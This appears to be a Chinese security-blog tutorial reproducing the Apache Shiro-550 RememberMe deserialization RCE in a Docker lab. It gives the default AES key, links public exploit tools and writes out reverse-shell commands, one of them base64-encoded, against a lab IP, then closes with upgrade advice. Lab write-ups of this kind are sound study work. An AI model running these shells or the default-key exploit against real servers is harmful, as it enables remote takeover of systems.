#  【技术分享】shiro550漏洞复现与研究   
pony686  安全客   2023-04-03 09:59  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1RRxHpo5Pag4RnwgrZESXA06Sjyp1eOJ8TRoFteaMcJhG8zxCnXgKCQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
> 前言：就像雨总会停，雾总会散，同样地没有谁会一直失败。  
  
##   
  
1  
  
**漏洞描述**  
### 1.shiro概述  
  
Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。  
### 2.漏洞原理  
  
Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。  
### 3.漏洞发现  
  
1、检索RememberMe cookie 的值  
  
2、Base 64解码  
  
3、使用AES解密(加密密钥硬编码)  
  
4、进行反序列化操作（未作过滤处理）  
  
4.shiro序列化利用条件  
  
由于使用了aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。  
  
尽管目前已经更新了许多版本，官方并没有反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用来固定的编码，这里我们可以通过搜索引擎、github等来收集密钥，提高漏洞检测与利用的成功率。  
  
   
  
2  
  
**漏洞复现**  
##   
### 1.环境搭建  
  
获取docker镜像  
  
docker pull medicean/vulapps:s_shiro_1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1BNsCk8DobZ7MGsybn5c1VKkBnjD36XYMAYn3OW259bVzpYV83kWjqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
重启docker  
  
systemctl restart docker  
  
启动docker镜像：  
  
docker run -d -p 8081:8080 medicean/vulapps:s_shiro_1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1cNEgDplElePkce1RGIWiaygs375OIDtO2pvpIhPol9OIeQBdF6VbW9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
访问：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1TibRFpicEaNmQW8tap1pnSKBhvwa0dibibtbBmv2iaWeOUhVLgnkQsA22kg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1ESicluBY26aOwFrZMpGdV1icpWzibkiawdicGwhvibRrHWKhXAZeoJoZPUEA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
抓包分析  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1tTWAVlmYgGjTibpBI3oYwqdEJ7oPZCxj7pO30W2xk1fwEghbZvNaqsA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 2.漏洞利用（1）—脚本攻击  
  
1. 下载shiro利用脚本，下载地址https://github.com/zhzyker/shiro-1.2.4-rce  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1Tp85XRczSblia5sWItGrpmpXLfqgc67w3pQkvtPPK5QOLOuf9ocvanw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
2 . 使用工具进行验证  
  
python3 shiro-1.2.4_rce.py   
http://10.10.10.128:8081/login  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1T0O93aDJiajiakccHVFKWJ5DmqjnW9lR6X7WD6icXrHBWnUy8cS9p1org/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
3.使用linux进入linuxshell模式。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1oISkXwpOPibpBicAW4OXxgjYoMwSiaicfkHbw6C5fcGKABnbKXyJLrK1jQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
1. windos ：bash -i >& /dev/tcp/10.10.10.128:8080/ 0>&1  
  
linux系统需要编码之后，绕后再进行nc反弹。  
  
http://www.jackson-t.ca/runtime-exec-payloads.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1vMV1JcIJkrnRR9BAfAHxYDicjyJHbulzWpbV2iagq2hDznaOdQ8wZmeA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
5.然后使用nc反弹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN18BUplsBgJ5WXic43AyOnian6qcy0c6u2iaUHBfFwOj91wnLdjhZOuAKicw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 漏洞利用（2）—自动化工具攻击  
  
1.选择shiro550  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1IcqufQ9JoTkZ7wvNiazP5WZKP77zdOs5vWBlAUYQUQA1XDGQfyIb64Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
2.然后使用ceye.io进行利用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1Sfo7I5k2nkibJPXB4Via11HtPOib3WAfdST9qaMIFRgv7HoAsSvgljH1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
3.验证key值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1SBYnkLgseLyw7NywL1zPlKbT2u1MMboI9NRJuNKPBWqA0dAHngRuQw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
4.检测到漏洞，然后使用nc反弹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1uGdXlSZS384QwZLzmpvgGK9fB6sIoFJGkPwYoqOMiaezA8k1TVWorYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1BxiaHu3YNH2WZ4OQxQpiaONMXT79KBJWOm2y276ZspgMpckiasSwiaCA5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
5.然后监听到shell。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1QNibDlicDUDBpc3EOabQZGzxCYKZaMn5JWxibhocPHLcicZGzMTUb9GHug/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 漏洞利用方式3：burp插件  
  
感谢作者（pmiaowu）提供的插件。  
  
下载地址：  
https://github.com/pmiaowu/BurpShiroPassiveScan  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1ibo5V0WanRAiaaQiaERJnuwk0x89RTQnrDiccMeyEibkhfz3ibJXVuXziar9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
   
  
3  
  
**vulhub环境复现**  
##   
### 1.启动环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN11yeoP76FvD8iaDdpLarIrV671dPdnwIhCrggN3lhdp70MTymQhXLtxg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 2.访问主页  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1qAcYQkKZ9LPeunBd477rwpp5iadDP0pibGZJhicgJ86sTeicbS39k9KNIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 3.使用脚本进行漏洞检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN129sp7j2daR3L0QEILicmKluFVia7GsHN16Qysgica9GMNAm1fwOWq5nibA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 4.查看命令是否成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1FSzAON7NlhAHbPSF2pjwQX37A2gVnLEHJzyCvXp63ib0twDVgxs1BTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
4.使用命令：  
  
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMjgvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1ZN8Sf3eyf3VqPLvujczLye8YQEOW13gNHibce0W4Cbzzkg7EhNH4uoQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
反弹shell  
### 5.执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1AZ1D3eZHMThr9Sr9SxMnPZbgsykibqKicdtiajQFt88TpnbgKGticmkLMw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
### 6.反弹成功，拿到权限。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6kZEXEVRkusyJtpffKjVN1wrzpTs33JeEVZibib6eiaibImwYTtaVEaqFCdvIeM9LJMKS4Xf5J4PFnrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
   
  
4  
  
**漏洞原理分析**  
##   
  
原理分析：根据shiro报告分析可以得到，主要存在几个重要的点:  
  
rememberMe cookie  
  
CookieRememberMeManager.java  
  
Base64  
  
AES  
  
加密密钥硬编码  
  
Java serialization  
  
1.首先正常登录，然后生成带有rememberme的返回cookie值。  
  
2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager  
  
3.之后进入serialize，对登录认证信息进行序列化  
  
4.然后加密，调用aes算法。  
  
5.加密结束，然后在在org/apache/shiro/web/mgt/CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回  
  
6.解析cookie  
  
7.先解密在反序列化  
  
8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码  
  
9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager()这里用的是默认反序列化类,然后触发生成反序列化。  
  
   
  
5  
  
**修复建议**  
##   
  
Apache Shiro 1.2.5以下版本，建议抓紧升级shiro的版本，另一个修复建议就是将默认Key加密改为生成随机的Key加密。  
  
  
6  
  
**总结**  
##   
  
web渗透不只有owasp10常见的一些漏洞，我们还需要学习一些框架的漏洞还有一些中间件的漏洞，自己的知识面广了，自己的渗透路就会更加宽阔。本文为初学者对中间件漏洞的一些理解。会的大佬跳过哈。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "虚线阴影分割线")  
  
```
```  
  
